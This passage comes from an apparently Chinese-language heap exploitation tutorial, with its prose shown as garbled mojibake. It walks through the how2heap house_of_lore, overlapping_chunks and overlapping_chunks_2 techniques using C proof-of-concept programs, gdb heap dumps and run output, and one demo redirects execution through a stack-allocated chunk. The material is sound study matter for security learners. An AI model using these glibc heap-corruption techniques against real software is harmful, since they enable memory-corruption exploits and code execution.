0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      &lt;-- fd-&gt;fake chunk 1
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 1
0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30     &lt;-- fd-&gt;victim chunk, bk-&gt;fake chunk 2
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“ small bins æ˜¯å…ˆè¿›åŽå‡ºçš„ï¼ŒèŠ‚ç‚¹çš„å¢žåŠ å‘ç”Ÿåœ¨é“¾è¡¨å¤´éƒ¨ï¼Œè€Œåˆ é™¤å‘ç”Ÿåœ¨å°¾éƒ¨ã€‚è¿™æ—¶æ•´æ¡é“¾æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-text">HEAD(undefined) &lt;-&gt; fake chunk 2 &lt;-&gt; fake chunk 1 &lt;-&gt; victim chunk &lt;-&gt; TAIL

fd: -&gt;
bk: &lt;-
</code></pre>
<p>fake chunk 2 çš„ bk æŒ‡å‘äº†ä¸€ä¸ªæœªå®šä¹‰çš„åœ°å€ï¼Œå¦‚æžœèƒ½é€šè¿‡å†…å­˜æ³„éœ²ç­‰æ‰‹æ®µï¼Œæ‹¿åˆ° HEAD çš„åœ°å€å¹¶å¡«è¿›åŽ»ï¼Œæ•´æ¡é“¾å°±é—­åˆäº†ã€‚å½“ç„¶è¿™é‡Œå®Œå…¨æ²¡æœ‰å¿…è¦è¿™ä¹ˆåšã€‚</p>
<p>æŽ¥ä¸‹æ¥çš„ç¬¬ä¸€ä¸ª mallocï¼Œä¼šè¿”å›ž victim chunk çš„åœ°å€ï¼Œå¦‚æžœ malloc çš„å¤§å°æ­£å¥½ç­‰äºŽ victim chunk çš„å¤§å°ï¼Œé‚£ä¹ˆæƒ…å†µä¼šç®€å•ä¸€ç‚¹ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸è¿™æ ·åšï¼Œmalloc ä¸€ä¸ªå°ä¸€ç‚¹çš„åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œmalloc ä»Ž small bin é‡Œå–å‡ºäº†æœ«å°¾çš„ victim chunkï¼Œåˆ‡äº†ä¸€å—è¿”å›žç»™ chunk p3ï¼Œç„¶åŽæŠŠå‰©ä¸‹çš„éƒ¨åˆ†æ”¾å›žåˆ°äº† unsorted binã€‚åŒæ—¶ small bin å˜æˆäº†è¿™æ ·ï¼š</p>
<pre><code class="language-text">HEAD(undefined) &lt;-&gt; fake chunk 2 &lt;-&gt; fake chunk 1 &lt;-&gt; TAIL
gefâž¤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000051  &lt;-- chunk p3
0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x0000000000000041  &lt;-- unsorted bin
0x603060:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000040    0x0000000000000020  &lt;-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000000111  &lt;-- chunk p2
0x6030c0:    0x0000000000000000    0x0000000000000000
gefâž¤  x/10gx &amp;stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2
0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      &lt;-- fd-&gt;fake chunk 1
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 1
0x7fffffffdc60:    0x00007ffff7dd1bf8    0x00007fffffffdc30      &lt;-- fd-&gt;TAIL, bk-&gt;fake chunk 2
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603050, bk=0x603050
 â†’   Chunk(addr=0x603060, size=0x40, flags=PREV_INUSE)
</code></pre>
<p>æœ€åŽï¼Œå†æ¬¡ malloc å°†è¿”å›ž fake chunk 1 çš„åœ°å€ï¼Œåœ°å€åœ¨æ ˆä¸Šä¸”æˆ‘ä»¬èƒ½å¤ŸæŽ§åˆ¶ã€‚åŒæ—¶ small bin å˜æˆè¿™æ ·ï¼š</p>
<pre><code class="language-text">HEAD(undefined) &lt;-&gt; fake chunk 2 &lt;-&gt; TAIL
gefâž¤  x/10gx &amp;stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2
0x7fffffffdc40:    0x00007ffff7dd1bf8    0x0000000000400aed      &lt;-- fd-&gt;TAIL
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- chunk 4
0x7fffffffdc60:    0x4141414141414141    0x4141414141414141
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
</code></pre>
<p>äºŽæ˜¯æˆ‘ä»¬å°±æˆåŠŸåœ°éª—è¿‡äº† malloc åœ¨æ ˆä¸Šåˆ†é…äº†ä¸€ä¸ª chunkã€‚</p>
<p>æœ€åŽå†æƒ³ä¸€ä¸‹ï¼Œå…¶å®žæœ€åˆçš„ victim chunk ä½¿ç”¨ fast chunk ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå…¶é‡Šæ”¾åŽè™½ç„¶æ˜¯è¢«åŠ å…¥åˆ° fast bins ä¸­ï¼Œè€Œä¸æ˜¯ unsorted binï¼Œä½† malloc ä¹‹åŽï¼Œä¹Ÿä¼šè¢«æ•´ç†åˆ° small bins é‡Œã€‚è‡ªè¡Œå°è¯•å§ã€‚</p>
<p>heap-use-after-freeï¼Œæ‰€ä»¥ä¸Šé¢æˆ‘ä»¬ç”¨äºŽä¿®æ”¹ bk æŒ‡é’ˆçš„æ¼æ´žï¼Œåº”è¯¥å°±æ˜¯ä¸€ä¸ª UAF å§ï¼Œå½“ç„¶æº¢å‡ºä¹Ÿæ˜¯å¯ä»¥çš„ï¼š</p>
<pre><code class="language-text">$ gcc -fsanitize=address -g house_of_lore.c
$ ./a.out
Allocated the victim (small) chunk: 0x60c00000bf80
stack_buffer_1: 0x7ffd1fbc5cd0
stack_buffer_2: 0x7ffd1fbc5c90

Freeing the victim chunk 0x60c00000bf80, it will be inserted in the unsorted bin
=================================================================
==6034==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c00000bf80 at pc 0x000000400eec bp 0x7ffd1fbc5bf0 sp 0x7ffd1fbc5be0
READ of size 8 at 0x60c00000bf80 thread T0
    #0 0x400eeb in main /home/firmy/how2heap/house_of_lore.c:27
    #1 0x7febee33c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #2 0x400b38 in _start (/home/firmy/how2heap/a.out+0x400b38)
</code></pre>
<p>æœ€åŽå†ç»™ä¸€ä¸ª libc-2.27 ç‰ˆæœ¬çš„ï¼š</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }

int main() {
    intptr_t *victim = malloc(0x80);

    // fill the tcache
    int *a[10];
    int i;
    for (i = 0; i &lt; 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i &lt; 7; i++) {
        free(a[i]);
    }

    memset(victim, 'A', 0x80);
    void *p5 = malloc(0x10);
    memset(p5, 'A', 0x10);
    intptr_t *victim_chunk = victim - 2;
    fprintf(stderr, &quot;Allocated the victim (small) chunk: %p\n&quot;, victim);

    intptr_t* stack_buffer_1[4] = {0};
    intptr_t* stack_buffer_2[6] = {0};
    stack_buffer_1[0] = 0;
    stack_buffer_1[2] = victim_chunk;
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
    stack_buffer_2[3] = (intptr_t*)stack_buffer_1;    // 3675 bck-&gt;fd = bin;

    fprintf(stderr, &quot;stack_buffer_1: %p\n&quot;, (void*)stack_buffer_1);
    fprintf(stderr, &quot;stack_buffer_2: %p\n\n&quot;, (void*)stack_buffer_2);

    free((void*)victim);
    fprintf(stderr, &quot;Freeing the victim chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
    fprintf(stderr, &quot;victim-&gt;fd: %p\n&quot;, (void *)victim[0]);
    fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

    void *p2 = malloc(0x100);
    fprintf(stderr, &quot;Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\n&quot;, p2);
    fprintf(stderr, &quot;The victim chunk %p will be inserted in front of the SmallBin\n&quot;, victim);
    fprintf(stderr, &quot;victim-&gt;fd: %p\n&quot;, (void *)victim[0]);
    fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

    victim[1] = (intptr_t)stack_buffer_1;
    fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);

    void *p3 = malloc(0x40);

    // empty the tcache
    for (i = 0; i &lt; 7; i++) {
        a[i] = malloc(0x80);
    }

    char *p4 = malloc(0x80);
    memset(p4, 'A', 0x10);
    fprintf(stderr, &quot;This last malloc should return a chunk at the position injected in bin-&gt;bk: %p\n&quot;, p4);
    fprintf(stderr, &quot;The fd pointer of stack_buffer_2 has changed: %p\n\n&quot;, stack_buffer_2[2]);

    intptr_t sc = (intptr_t)jackpot;
    memcpy((p4+0xa8), &amp;sc, 8);
}
$ gcc -g house_of_lore.c
$ ./a.out
Allocated the victim (small) chunk: 0x55674d75f260
stack_buffer_1: 0x7ffff71fb1d0
stack_buffer_2: 0x7ffff71fb1f0

Freeing the victim chunk 0x55674d75f260, it will be inserted in the unsorted bin
victim-&gt;fd: 0x7f1eba392b00
victim-&gt;bk: 0x7f1eba392b00

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x55674d75f700
The victim chunk 0x55674d75f260 will be inserted in front of the SmallBin
victim-&gt;fd: 0x7f1eba392b80
victim-&gt;bk: 0x7f1eba392b80

Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
This last malloc should return a chunk at the position injected in bin-&gt;bk: 0x7ffff71fb1e0
The fd pointer of stack_buffer_2 has changed: 0x7ffff71fb1e0

Nice jump d00d
</code></pre>
<h3 id="overlapping_chunks">overlapping_chunks</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

int main() {
    intptr_t *p1,*p2,*p3,*p4;

    p1 = malloc(0x90 - 8);
    p2 = malloc(0x90 - 8);
    p3 = malloc(0x80 - 8);
    memset(p1, 'A', 0x90 - 8);
    memset(p2, 'A', 0x90 - 8);
    memset(p3, 'A', 0x80 - 8);
    fprintf(stderr, &quot;Now we allocate 3 chunks on the heap\n&quot;);
    fprintf(stderr, &quot;p1=%p\np2=%p\np3=%p\n\n&quot;, p1, p2, p3);

    free(p2);
    fprintf(stderr, &quot;Freeing the chunk p2\n&quot;);

    int evil_chunk_size = 0x111;
    int evil_region_size = 0x110 - 8;
    *(p2-1) = evil_chunk_size; // Overwriting the &quot;size&quot; field of chunk p2
    fprintf(stderr, &quot;Emulating an overflow that can overwrite the size of the chunk p2.\n\n&quot;);

    p4 = malloc(evil_region_size);
    fprintf(stderr, &quot;p4: %p ~ %p\n&quot;, p4, p4+evil_region_size);
    fprintf(stderr, &quot;p3: %p ~ %p\n&quot;, p3, p3+0x80);

    fprintf(stderr, &quot;\nIf we memset(p4, 'B', 0xd0), we have:\n&quot;);
    memset(p4, 'B', 0xd0);
    fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
    fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);

    fprintf(stderr, &quot;\nIf we memset(p3, 'C', 0x50), we have:\n&quot;);
    memset(p3, 'C', 0x50);
    fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
    fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);
}
$ gcc -g overlapping_chunks.c
$ ./a.out
Now we allocate 3 chunks on the heap
p1=0x1e2b010
p2=0x1e2b0a0
p3=0x1e2b130

Freeing the chunk p2
Emulating an overflow that can overwrite the size of the chunk p2.

p4: 0x1e2b0a0 ~ 0x1e2b8e0
p3: 0x1e2b130 ~ 0x1e2b530

If we memset(p4, 'B', 0xd0), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

If we memset(p3, 'C', 0x50), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
</code></pre>
<p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å †å—é‡å çš„é—®é¢˜ã€‚é€šè¿‡ä¸€ä¸ªæº¢å‡ºæ¼æ´žï¼Œæ”¹å†™ unsorted bin ä¸­ç©ºé—²å †å—çš„ sizeï¼Œæ”¹å˜ä¸‹ä¸€æ¬¡ malloc å¯ä»¥è¿”å›žçš„å †å—å¤§å°ã€‚</p>
<p>é¦–å…ˆåˆ†é…ä¸‰ä¸ªå †å—ï¼Œç„¶åŽé‡Šæ”¾æŽ‰ä¸­é—´çš„ä¸€ä¸ªï¼š</p>
<pre><code class="language-text">gefâž¤  x/60gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x4141414141414141
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 2 [be freed]
0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x6020b0:    0x4141414141414141    0x4141414141414141
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x0000000000000090    0x0000000000000080  &lt;-- chunk 3
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x4141414141414141
0x602150:    0x4141414141414141    0x4141414141414141
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x0000000000020e61  &lt;-- top chunk
0x6021b0:    0x0000000000000000    0x0000000000000000
0x6021c0:    0x0000000000000000    0x0000000000000000
0x6021d0:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
 â†’   Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE)
</code></pre>
<p>chunk 2 è¢«æ”¾åˆ°äº† unsorted bin ä¸­ï¼Œå…¶ size å€¼ä¸º 0x90ã€‚</p>
<p>æŽ¥ä¸‹æ¥ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæº¢å‡ºæ¼æ´žï¼Œå¯ä»¥æ”¹å†™ chunk 2 çš„ size å€¼ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘ä»¬å°†å…¶æ”¹ä¸º 0x111ï¼Œä¹Ÿå°±æ˜¯åŽŸæœ¬ chunk 2 å’Œ chunk 3 çš„å¤§å°ç›¸åŠ ï¼Œæœ€åŽä¸€ä½æ˜¯ 1 è¡¨ç¤º chunk 1 æ˜¯åœ¨ä½¿ç”¨çš„ï¼Œå…¶å®žæœ‰æ²¡æœ‰éƒ½æ— æ‰€è°“ã€‚</p>
<pre><code class="language-text">gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
 â†’   Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE)
</code></pre>
<p>è¿™æ—¶ unsorted bin ä¸­çš„æ•°æ®ä¹Ÿæ›´æ”¹äº†ã€‚</p>
<p>æŽ¥ä¸‹æ¥ malloc ä¸€ä¸ªå¤§å°çš„ç­‰äºŽ chunk 2 å’Œ chunk 3 ä¹‹å’Œçš„ chunk 4ï¼Œè¿™ä¼šå°† chunk 2 å’Œ chunk 3 éƒ½åŒ…å«è¿›æ¥ï¼š</p>
<pre><code class="language-text">gefâž¤  x/60gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x4141414141414141
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x0000000000000111  &lt;-- chunk 4
0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x6020b0:    0x4141414141414141    0x4141414141414141
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x0000000000000090    0x0000000000000080  &lt;-- chunk 3
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x4141414141414141
0x602150:    0x4141414141414141    0x4141414141414141
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x0000000000020e61  &lt;-- top chunk
0x6021b0:    0x0000000000000000    0x0000000000000000
0x6021c0:    0x0000000000000000    0x0000000000000000
0x6021d0:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>è¿™æ ·ï¼Œç›¸å½“äºŽ chunk 4 å’Œ chunk 3 å°±é‡å äº†ï¼Œä¸¤ä¸ª chunk å¯ä»¥äº’ç›¸ä¿®æ”¹å¯¹æ–¹çš„æ•°æ®ã€‚å°±åƒä¸Šé¢çš„è¿è¡Œç»“æžœæ‰“å°å‡ºæ¥çš„é‚£æ ·ã€‚</p>
<h3 id="overlapping_chunks_2">overlapping_chunks_2</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main() {
    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
    unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
    int prev_in_use = 0x1;

    p1 = malloc(0x10);
    p2 = malloc(0x80);
    p3 = malloc(0x80);
    p4 = malloc(0x80);
    p5 = malloc(0x10);
    real_size_p1 = malloc_usable_size(p1);
    real_size_p2 = malloc_usable_size(p2);
    real_size_p3 = malloc_usable_size(p3);
    real_size_p4 = malloc_usable_size(p4);
    real_size_p5 = malloc_usable_size(p5);
    memset(p1, 'A', real_size_p1);
    memset(p2, 'A', real_size_p2);
    memset(p3, 'A', real_size_p3);
    memset(p4, 'A', real_size_p4);
    memset(p5, 'A', real_size_p5);
    fprintf(stderr, &quot;Now we allocate 5 chunks on the heap\n\n&quot;);
    fprintf(stderr, &quot;chunk p1: %p ~ %p\n&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1));
    fprintf(stderr, &quot;chunk p2: %p ~ %p\n&quot;, p2, (unsigned char *)p2+malloc_usable_size(p2));
    fprintf(stderr, &quot;chunk p3: %p ~ %p\n&quot;, p3, (unsigned char *)p3+malloc_usable_size(p3));
    fprintf(stderr, &quot;chunk p4: %p ~ %p\n&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4));
    fprintf(stderr, &quot;chunk p5: %p ~ %p\n&quot;, p5, (unsigned char *)p5+malloc_usable_size(p5));

    free(p4);
    fprintf(stderr, &quot;\nLet's free the chunk p4\n\n&quot;);

    fprintf(stderr, &quot;Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\n\n&quot;);
    *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE

    free(p2);

    p6 = malloc(0x1b0 - 0x10);
    real_size_p6 = malloc_usable_size(p6);
    fprintf(stderr, &quot;Allocating a new chunk 6: %p ~ %p\n\n&quot;, p6, (unsigned char *)p6+real_size_p6);

    fprintf(stderr, &quot;Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\n&quot;);
    fprintf(stderr, &quot;p3 before = %s\n&quot;, (char *)p3);
    memset(p6, 'B', 0xd0);
    fprintf(stderr, &quot;p3 after  = %s\n&quot;, (char *)p3);
}
$ gcc -g overlapping_chunks_2.c
$ ./a.out
Now we allocate 5 chunks on the heap

chunk p1: 0x18c2010 ~ 0x18c2028
chunk p2: 0x18c2030 ~ 0x18c20b8
chunk p3: 0x18c20c0 ~ 0x18c2148
chunk p4: 0x18c2150 ~ 0x18c21d8
chunk p5: 0x18c21e0 ~ 0x18c21f8

Let's free the chunk p4

Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)

Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8

Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)
p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½
p3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½
</code></pre>
<p>åŒæ ·æ˜¯å †å—é‡å çš„é—®é¢˜ï¼Œå‰é¢é‚£ä¸ªæ˜¯åœ¨ chunk å·²ç»è¢« freeï¼ŒåŠ å…¥åˆ°äº† unsorted bin ä¹‹åŽï¼Œå†ä¿®æ”¹å…¶ size å€¼ï¼Œç„¶åŽ malloc ä¸€ä¸ªä¸ä¸€æ ·çš„ chunk å‡ºæ¥ï¼Œè€Œè¿™é‡Œæ˜¯åœ¨ free ä¹‹å‰ä¿®æ”¹ size å€¼ï¼Œä½¿ free é”™è¯¯åœ°ä¿®æ”¹äº†ä¸‹ä¸€ä¸ª chunk çš„ prev_size å€¼ï¼Œå¯¼è‡´ä¸­é—´çš„ chunk å¼ºè¡Œåˆå¹¶ã€‚å¦å¤–å‰é¢é‚£ä¸ªé‡å æ˜¯ç›¸é‚»å †å—ä¹‹é—´çš„ï¼Œè€Œè¿™é‡Œæ˜¯ä¸ç›¸é‚»å †å—ä¹‹é—´çš„ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦äº”ä¸ªå †å—ï¼Œå‡è®¾ç¬¬ chunk 1 å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥æ”¹å†™ç¬¬äºŒä¸ª chunk 2 çš„æ•°æ®ï¼Œchunk 5 çš„ä½œç”¨æ˜¯é˜²æ­¢é‡Šæ”¾ chunk 4 åŽè¢«åˆå¹¶è¿› top chunkã€‚æ‰€ä»¥æˆ‘ä»¬è¦é‡å çš„åŒºåŸŸæ˜¯ chunk 2 åˆ° chunk 4ã€‚é¦–å…ˆå°† chunk 4 é‡Šæ”¾æŽ‰ï¼Œæ³¨æ„çœ‹ chunk 5 çš„ prev_size å€¼ï¼š</p>
<pre><code class="language-text">gefâž¤  x/70gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 2
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x4141414141414141
0x6020a0:    0x4141414141414141    0x4141414141414141
0x6020b0:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 3
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x4141414141414141    0x4141414141414141
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x0000000000000091  &lt;-- chunk 4 [be freed]
0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x4141414141414141
0x6021b0:    0x4141414141414141    0x4141414141414141
0x6021c0:    0x4141414141414141    0x4141414141414141
0x6021d0:    0x0000000000000090    0x0000000000000020  &lt;-- chunk 5 &lt;-- prev_size
0x6021e0:    0x4141414141414141    0x4141414141414141
0x6021f0:    0x4141414141414141    0x0000000000020e11  &lt;-- top chunk
0x602200:    0x0000000000000000    0x0000000000000000
0x602210:    0x0000000000000000    0x0000000000000000
0x602220:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602140, bk=0x602140
 â†’   Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE)
</code></pre>
<p>free chunk 4 è¢«æ”¾å…¥ unsorted binï¼Œå¤§å°ä¸º 0x90ã€‚</p>
<p>æŽ¥ä¸‹æ¥æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œåˆ©ç”¨ chunk 1 çš„æº¢å‡ºæ¼æ´žï¼Œå°† chunk 2 çš„ size å€¼ä¿®æ”¹ä¸º chunk 2 å’Œ chunk 3 çš„å¤§å°ä¹‹å’Œï¼Œå³ 0x90+0x90+0x1=0x121ï¼Œæœ€åŽçš„ 1 æ˜¯æ ‡å¿—ä½ã€‚è¿™æ ·å½“æˆ‘ä»¬é‡Šæ”¾ chunk 2 çš„æ—¶å€™ï¼Œmalloc æ ¹æ®è¿™ä¸ªè¢«ä¿®æ”¹çš„ size å€¼ï¼Œä¼šä»¥ä¸º chunk 2 åŠ ä¸Š chunk 3 çš„åŒºåŸŸéƒ½æ˜¯è¦é‡Šæ”¾çš„ï¼Œç„¶åŽå°±é”™è¯¯åœ°ä¿®æ”¹äº† chunk 5 çš„ prev_sizeã€‚æŽ¥ç€ï¼Œå®ƒå‘çŽ°ç´§é‚»çš„ä¸€å— chunk 4 ä¹Ÿæ˜¯ free çŠ¶æ€ï¼Œå°±æŠŠå®ƒä¿©åˆå¹¶åœ¨äº†ä¸€èµ·ï¼Œç»„æˆä¸€ä¸ªå¤§ free chunkï¼Œæ”¾è¿› unsorted bin ä¸­ã€‚</p>
<pre><code class="language-text">gefâž¤  x/70gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
